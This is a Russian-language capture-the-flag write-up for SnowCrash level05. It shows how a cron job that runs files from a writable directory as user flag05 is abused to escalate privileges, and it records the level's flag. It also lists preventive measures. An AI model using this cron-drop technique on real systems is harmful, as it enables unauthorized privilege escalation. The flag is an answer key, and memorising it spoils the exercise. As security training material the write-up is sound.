Level05
==========================

Flag
----

viuaaale9huek52boumoomioc

* * *

Discovery
---------

### Пробуем getflag

    level05@SnowCrash:~$ getflag
    Check flag.Here is your token :
    Nope there is no token here for you sorry. Try again :)

Ожидаемо — без прав пользователя **flag05** мы токен не получим.

### Проверяем содержимое домашней директории

    level05@SnowCrash:~$ ls
    level05@SnowCrash:~$

Папка пустая — никаких бинарников, скриптов или подсказок.

### Ищем файлы, принадлежащие level05

Результат — ничего полезного (всё в /proc). Поэтому сразу ищем файлы хозяина уровня: **flag05**.

### Поиск файлов пользователя flag05

    level05@SnowCrash:~$ find / -user "flag05" 2>/dev/null
    /usr/sbin/openarenaserver
    /rofs/usr/sbin/openarenaserver

Проверяем содержимое файла:

    level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
    #!/bin/sh

    for i in /opt/openarenaserver/\* ; do
            (ulimit -t 5; bash -x "$i")
            rm -f "$i"
    done

Сразу несколько наблюдений:

*   Скрипт запускает все файлы в `/opt/openarenaserver/*`.
*   Запускает их через bash — значит мы можем вставить туда любой код.
*   После выполнения файл удаляется.

Значит, если мы сможем заставить этот скрипт выполниться под пользователем **flag05**, то получим нужные привилегии.

* * *

Use (Exploit)
-------------

### Пробуем создать скрипт в /opt/openarenaserver

    level05@SnowCrash:~$ touch /opt/openarenasererver/script.sh
    level05@SnowCrash:~$ vim /opt/openarenasererver/script.sh

    #!/bin/bash
    getflag

Пробуем выполнить:

    level05@SnowCrash:~$ /opt/openarenasererver/script.sh
    bash: /opt/openarenasererver/script.sh: Permission denied

Добавляем права:

    level05@SnowCrash:~$ chmod +x /opt/openarenasererver/script.sh
    level05@SnowCrash:~$ /opt/openarenasererver/script.sh
    Check flag.Here is your token :
    Nope there is no token here for you sorry. Try again :)

Так и должно быть — скрипт исполняется **от имени level05**, а не flag05.

### Пробуем запустить openarenaserver напрямую

    level05@SnowCrash:~$ /usr/sbin/openarenaserver
    bash: /usr/sbin/openarenaserver: Permission denied

Логично — файл принадлежит flag05.

### Ищем, где этот скрипт может автоматически запускаться

Ищем упоминания:

    level05@SnowCrash:/$ grep -rnw '/var' -e 'openarenaserver' 2>/dev/null
    /var/mail/level05:1:\*/2 \* \* \* \* su -c "sh /usr/sbin/openarenaserver" - flag05
    /var/spool/mail/level05:1:\*/2 \* \* \* \* su -c "sh /usr/sbin/openarenaserver" - flag05

Это выглядит как cron‑задание. Проверяем файл:

    level05@SnowCrash:/$ cat /var/mail/level05
    */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

*   */2 * * * * → выполняется каждые 2 минуты
*   su -c "..." - flag05 → запускает команду от имени flag05
*   sh /usr/sbin/openarenaserver → запускается именно **наш скрипт**

То есть любой файл, который мы положим в `/opt/openarenaserver`, через максимум 2 минуты будет выполнен **от имени flag05**.

### Проверяем, запущен ли cron

    level05@SnowCrash:/$ ps -ef | grep cron
    root      1502     1  0 16:00 ?        00:00:00 cron

Cron работает — отлично.

### Создаём полезный скрипт

Так как мы не знаем, куда у нас есть права записи, пробуем сохранить флаг в /tmp:

    level05@SnowCrash:/$ vim /opt/openarenaserver/script.sh

Содержимое:

    #!/bin/bash

    touch /tmp/getflag
    getflag > /tmp/getflag

Через 2 минуты проверяем:

    level05@SnowCrash:/$ cat tmp/getflag
    Check flag.Here is your token : viuaaale9huek52boumoomioc

Готово — мы получили флаг пользователя flag05.

* * *

Prevention
----------

Чтобы избежать подобной уязвимости, требуется:

*   **Никогда не исполнять файлы из директории, куда может писать другой пользователь**.
*   Использовать строгие разрешения: `chmod 700 /opt/openarenaserver`.
*   Проверять владельца каждого файла перед выполнением.
*   Отказаться от скриптов, запускаемых cron от имени привилегированного пользователя.
*   Избежать конструкции вида `bash -x "$i"` — она напрямую исполняет пользовательский код.

* * *

Documentation
-------------

*   man cron
*   man crontab
*   man su
*   man bash
*   man find